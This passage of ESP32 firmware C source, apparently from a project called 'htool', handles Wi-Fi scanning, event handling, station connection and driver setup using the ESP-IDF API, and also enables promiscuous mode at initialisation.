            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE, pdMS_TO_TICKS(8000));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                if (scan_manually_stopped) {
                    scan_manually_stopped = false; perform_passive_scan = false; scan_started = false; break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num; global_scans_num = 32;
                perform_passive_scan = false; scan_started = false;
            } else {
                perform_passive_scan = false; scan_started = false; ESP_LOGE(TAG, "Scan timeout");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) wifi_client->wifi_station_active = true;
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_STOP) wifi_client->wifi_station_active = false;
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) xEventGroupSetBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t *dr = event_data;
        if (dr->reason != WIFI_REASON_ASSOC_LEAVE) {
            wifi_client->wifi_connected = false; xEventGroupSetBits(wifi_client->status_bits, WIFI_DISCONNECTED);
        }
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        // Do nothing
    }
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        wifi_client->wifi_connected = true; xEventGroupSetBits(wifi_client->status_bits, WIFI_CONNECTED);
    }
}

bool htool_wifi_is_wifi_connected() { return wifi_client->wifi_connected; }
uint8_t htool_wifi_connect() {
    xEventGroupClearBits(wifi_client->status_bits, WIFI_CONNECTED | WIFI_DISCONNECTED);
    esp_wifi_connect();
    EventBits_t uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_CONNECTED | WIFI_DISCONNECTED, true, false, pdMS_TO_TICKS(8000));
    return (uxBits & WIFI_CONNECTED) ? HTOOL_OK : HTOOL_ERR_WIFI_NOT_CONNECT;
}
void htool_wifi_disconnect() { if (wifi_client->wifi_connected) { esp_wifi_disconnect(); wifi_client->wifi_connected = false; } }
void htool_wifi_setup_station(uint8_t ssid_index, char* password) {
    esp_wifi_stop();
    wifi_config_t config = {0};
    config.sta.scan_method = WIFI_ALL_CHANNEL_SCAN; config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    strncpy((char *)config.sta.ssid, (char *)global_scans[ssid_index].ssid, 32);
    strncpy((char *)config.sta.password, password, 32);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &config);
    esp_wifi_start();
}
void htool_set_wifi_sta_config() {
    esp_wifi_stop();
    wifi_config_t config = {0};
    config.sta.scan_method = WIFI_ALL_CHANNEL_SCAN; config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &config);
    esp_wifi_start();
}
esp_netif_t *htool_wifi_get_current_netif() { return wifi_client ? wifi_client->esp_netif : NULL; }
void htool_wifi_start() {
    if (esp_wifi_start() != ESP_OK) esp_restart();
    xTaskCreatePinnedToCore(wifi_handling_task, "wifi_handling_task", 4096, NULL, 6, &htask, PRO_CPU_NUM);
}
void htool_wifi_deinit() {
    if (htask) vTaskDelete(htask);
    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler);
    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler);
    esp_wifi_disconnect(); esp_wifi_stop(); esp_wifi_deinit();
    if (wifi_client) { vEventGroupDelete(wifi_client->status_bits); FREE_MEM(wifi_client); }
}

int htool_wifi_init() {
    wifi_client = calloc(1, sizeof(htool_wifi_client_t));
    wifi_client->status_bits = xEventGroupCreate();
    nvsm_init();
    ESP_ERROR_CHECK(esp_netif_init());

    // --- PATCH: INIT NETIFS SEPARATELY ---
    netif_ap = esp_netif_create_default_wifi_ap();
    netif_sta = esp_netif_create_default_wifi_sta();
    
    // Default to STA for scanning
    wifi_client->esp_netif = netif_sta;

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_channel(0, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);

    // ESP_ERROR_CHECK(esp_wifi_set_country(&ccconf));

    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler, NULL));

    return HTOOL_OK;
}